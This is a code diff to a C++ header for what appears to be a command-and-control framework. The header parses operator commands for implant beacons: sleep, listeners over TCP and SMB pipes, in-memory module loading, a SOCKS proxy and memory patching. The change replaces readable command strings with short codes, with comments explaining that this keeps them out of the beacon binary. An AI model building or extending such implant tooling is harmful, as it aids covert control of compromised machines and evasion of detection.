@@ -6,38 +6,68 @@
 
 #include "ModuleCmd.hpp"
 
-// TODO replace by number to avoid string in the binary
-const std::string HelpCmd = "help";
-const std::string SleepCmd = "sleep";
-const std::string EndCmd = "end";
-const std::string ListenerCmd = "listener";
-const std::string ListenerPollCmd = "listenerPoll";
-const std::string LoadC2ModuleCmd = "loadModule";
-const std::string UnloadC2ModuleCmd = "unloadModule";
-const std::string Socks5Cmd = "socks";
-const std::string GetInfoCmd = "getInfo";
-const std::string PatchMemoryCmd = "patchMemory";
 
-const std::string StartCmd = "start";
-const std::string StopCmd = "stop";
+#define ERROR_GENERIC 10000
+#define ERROR_LISTENER_EXIST 10001
+#define ERROR_PORT_FORMAT 10002
+#define ERROR_HASH_NOT_FOUND 10003
+#define ERROR_LOAD_LIBRARY 10004
+#define ERROR_GET_PROC_ADDRESS 10005
+#define ERROR_MODULE_NOT_FOUND 10006
+
+
+// TODO set an enum
+const std::string ListenerHttpType = "http";
+const std::string ListenerHttpsType = "https";
+const std::string ListenerTcpType = "tcp";
+const std::string ListenerSmbType = "smb";
+const std::string ListenerGithubType = "github";
+const std::string ListenerDnsType = "dns";
+
+
+// should only be use by the listener and beacon to communicate, could take any values
+const std::string SleepCmd = "SL";
+const std::string ListenerCmd = "LIS";
+const std::string ListenerPollCmd = "LISP";
+const std::string LoadC2ModuleCmd = "LM";
+const std::string UnloadC2ModuleCmd = "ULM";
+const std::string Socks5Cmd = "SO5";
+const std::string GetInfoCmd = "GI";
+const std::string PatchMemoryCmd = "PM";
+const std::string InitCmd = "IN";
+const std::string RunCmd = "RU";
+const std::string EndCmd = "EN";
+const std::string StartCmd = "STA";
+const std::string StopCmd = "STO";
 
 const std::string CmdStatusSuccess = "Success";
 const std::string CmdStatusFail = "Fail";
 
+
+#ifdef BUILD_TEAMSERVER
+
+const std::string SleepInstructionString = "sleep";
+const std::string EndInstructionString = "end";
+const std::string ListenerInstructionString = "listener";
+const std::string LoadModuleInstructionString = "loadModule";
+const std::string UnloadModuleInstructionString = "unloadModule";
+const std::string SocksInstructionString = "socks";
+const std::string GetInfoInstructionString = "getInfo";
+const std::string PatchMemoryInstructionString = "patchMemory";
 
 class CommonCommands
 {
 	public:
 	CommonCommands()
 	{
-		m_commonCommands.push_back(SleepCmd);
-		m_commonCommands.push_back(EndCmd);
-		m_commonCommands.push_back(ListenerCmd);
-		m_commonCommands.push_back(LoadC2ModuleCmd);
-		m_commonCommands.push_back(UnloadC2ModuleCmd);
-		m_commonCommands.push_back(Socks5Cmd);
-		m_commonCommands.push_back(GetInfoCmd);
-		m_commonCommands.push_back(PatchMemoryCmd);
+		m_commonCommands.push_back(SleepInstructionString);
+		m_commonCommands.push_back(EndInstructionString);
+		m_commonCommands.push_back(ListenerInstructionString);
+		m_commonCommands.push_back(LoadModuleInstructionString);
+		m_commonCommands.push_back(UnloadModuleInstructionString);
+		m_commonCommands.push_back(SocksInstructionString);
+		m_commonCommands.push_back(GetInfoInstructionString);
+		m_commonCommands.push_back(PatchMemoryInstructionString);
 	}
 
 	int getNumberOfCommand()
@@ -57,7 +87,7 @@ class CommonCommands
 	{
 		// OPSEC remove getHelp and getInfo strings from the beacon compilation
 		std::string output;
-#ifdef BUILD_TEAMSERVER
+
 		if(cmd==SleepCmd)
 		{
 			output = "sleep: \n";
@@ -116,7 +146,7 @@ class CommonCommands
 			output = "patchMemory: \n";
 			output += "TODO\n";
 		}
-#endif
+
 		return output;
 	}
 
@@ -124,13 +154,12 @@ class CommonCommands
 	// set_returnvalue(errorMsg) && return -1
 	int init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 	{
-#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
 		std::string instruction = splitedCmd[0];
 
 		//
 		// Sleep
 		//
-		if(instruction==SleepCmd)
+		if(instruction==SleepInstructionString)
 		{
 			if(splitedCmd.size()==2)
 			{
@@ -144,12 +173,12 @@ class CommonCommands
 					std::cerr << "Invalid argument: " << ia.what() << '\n';
 					return -1;
 				}
-				c2Message.set_instruction(instruction);
+				c2Message.set_instruction(SleepCmd);
 				c2Message.set_cmd(std::to_string(sleepTimeSec));	
 			}
 			else
 			{
-				std::string errorMsg = getHelp(instruction);
+				std::string errorMsg = getHelp(SleepCmd);
 				c2Message.set_returnvalue(errorMsg);
 				return -1;
 			}
@@ -157,19 +186,19 @@ class CommonCommands
 		//
 		// End
 		//
-		else if(instruction==EndCmd)
+		else if(instruction==EndInstructionString)
 		{
-			c2Message.set_instruction(instruction);
+			c2Message.set_instruction(EndCmd);
 			c2Message.set_cmd("");	
 		}
 		//
 		// Listener
 		//
-		else if(instruction==ListenerCmd)
+		else if(instruction==ListenerInstructionString)
 		{
 			if(splitedCmd.size()>=3)
 			{
-				if(splitedCmd[1]==StartCmd && splitedCmd[2]=="tcp")
+				if(splitedCmd[1]==StartCmd && splitedCmd[2]==ListenerTcpType)
 				{
 					if(splitedCmd.size()>=5)
 					{
@@ -185,14 +214,14 @@ class CommonCommands
 							return -1;
 						}
 
-						std::string cmd = splitedCmd[1];
+						std::string cmd = StartCmd;
 						cmd+=" ";
-						cmd+="tcp";
+						cmd+=ListenerTcpType;
 						cmd+=" ";
 						cmd+=host;
 						cmd+=" ";
 						cmd+=std::to_string(port);
-						c2Message.set_instruction(instruction);
+						c2Message.set_instruction(ListenerCmd);
 						c2Message.set_cmd(cmd);	
 					}
 					else
@@ -202,17 +231,17 @@ class CommonCommands
 						return -1;
 					}
 				}
-				else if(splitedCmd[1]==StartCmd && splitedCmd[2]=="smb")
+				else if(splitedCmd[1]==StartCmd && splitedCmd[2]==ListenerSmbType)
 				{
 					if(splitedCmd.size()>=4)
 					{
 						std::string pipeName = splitedCmd[3];
-						std::string cmd = splitedCmd[1];
+						std::string cmd = StartCmd;
 						cmd+=" ";
-						cmd+="smb";
+						cmd+=ListenerSmbType;
 						cmd+=" ";
 						cmd+=pipeName;
-						c2Message.set_instruction(instruction);
+						c2Message.set_instruction(ListenerCmd);
 						c2Message.set_cmd(cmd);	
 					}
 					else
@@ -225,16 +254,16 @@ class CommonCommands
 				else if(splitedCmd[1]==StopCmd)
 				{
 					std::string hash = splitedCmd[2];
-					std::string cmd = splitedCmd[1];
+					std::string cmd = StopCmd;
 					cmd+=" ";
 					cmd+=hash;
-					c2Message.set_instruction(instruction);
+					c2Message.set_instruction(ListenerCmd);
 					c2Message.set_cmd(cmd);	
 				}				
 			}
 			else
 			{
-				std::string errorMsg = getHelp(instruction);
+				std::string errorMsg = getHelp(ListenerCmd);
 				c2Message.set_returnvalue(errorMsg);
 				return -1;
 			}
@@ -242,7 +271,7 @@ class CommonCommands
 		//
 		// Load Memory Module
 		//
-		else if(instruction==LoadC2ModuleCmd)
+		else if(instruction==LoadModuleInstructionString)
 		{
 			if (splitedCmd.size() == 2)
 			{
@@ -267,7 +296,7 @@ class CommonCommands
 				{
 					std::string buffer(std::istreambuf_iterator<char>(input), {});
 
-					c2Message.set_instruction(splitedCmd[0]);
+					c2Message.set_instruction(LoadC2ModuleCmd);
 					c2Message.set_inputfile(inputFile);
 					c2Message.set_data(buffer.data(), buffer.size());
 				}
@@ -279,23 +308,23 @@ class CommonCommands
 			}
 			else
 			{
-				std::string errorMsg = getHelp(instruction);
+				std::string errorMsg = getHelp(LoadC2ModuleCmd);
 				c2Message.set_returnvalue(errorMsg);
 				return -1;
 			}
 		}
-		else if(instruction==UnloadC2ModuleCmd)
+		else if(instruction==UnloadModuleInstructionString)
 		{
 			if (splitedCmd.size() == 2)
 			{
 				std::string moduleName = splitedCmd[1];
 
-				c2Message.set_instruction(splitedCmd[0]);
+				c2Message.set_instruction(UnloadC2ModuleCmd);
 				c2Message.set_cmd(moduleName);
 			}
 			else
 			{
-				std::string errorMsg = getHelp(instruction);
+				std::string errorMsg = getHelp(UnloadC2ModuleCmd);
 				c2Message.set_returnvalue(errorMsg);
 				return -1;
 			}
@@ -303,7 +332,7 @@ class CommonCommands
 		//
 		// Socks5
 		//
-		else if(instruction==Socks5Cmd)
+		else if(instruction==SocksInstructionString)
 		{
 			if(splitedCmd.size()>=2)
 			{
@@ -322,9 +351,9 @@ class CommonCommands
 							return -1;
 						}
 
-						c2Message.set_instruction(instruction);
+						c2Message.set_instruction(Socks5Cmd);
+						c2Message.set_cmd(StartCmd);
 						c2Message.set_data(splitedCmd[2].data(), splitedCmd[2].size());	
-						c2Message.set_cmd(splitedCmd[1]);	
 					}
 					else
 					{
@@ -335,12 +364,12 @@ class CommonCommands
 				}
 				else if(splitedCmd[1]==StopCmd)
 				{
-					c2Message.set_instruction(instruction);
-					c2Message.set_cmd("stopSocks");	
+					c2Message.set_instruction(Socks5Cmd);
+					c2Message.set_cmd(StopCmd);	
 				}		
 				else
 				{
-					std::string errorMsg = getHelp(instruction);
+					std::string errorMsg = getHelp(Socks5Cmd);
 					c2Message.set_returnvalue(errorMsg);
 					return -1;
 				}
@@ -353,8 +382,30 @@ class CommonCommands
 				return -1;
 			}
 		}
+		return 0;
+	}
 
-#endif
+
+	int errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg) 
+	{
+		int errorCode = c2RetMessage.errorCode();
+		if(errorCode>0)
+		{
+			if(errorCode==ERROR_GENERIC)
+				errorMsg = "Error";
+			else if(errorCode==ERROR_LISTENER_EXIST)
+				errorMsg = "Error: Listener already exist";
+			else if(errorCode==ERROR_PORT_FORMAT)
+				errorMsg = "Error: Port format";
+			else if(errorCode==ERROR_HASH_NOT_FOUND)
+				errorMsg = "Error: Hash not found";
+			else if(errorCode==ERROR_LOAD_LIBRARY)
+				errorMsg = "Error: MemoryLoadLibrary";
+			else if(errorCode==ERROR_GET_PROC_ADDRESS)
+				errorMsg = "Error: MemoryGetProcAddress";
+			else if(errorCode==ERROR_MODULE_NOT_FOUND)
+				errorMsg = "Error: Module not found";
+		}
 		return 0;
 	}
 
@@ -390,5 +441,4 @@ private:
 };
 
 
-
-
+#endif
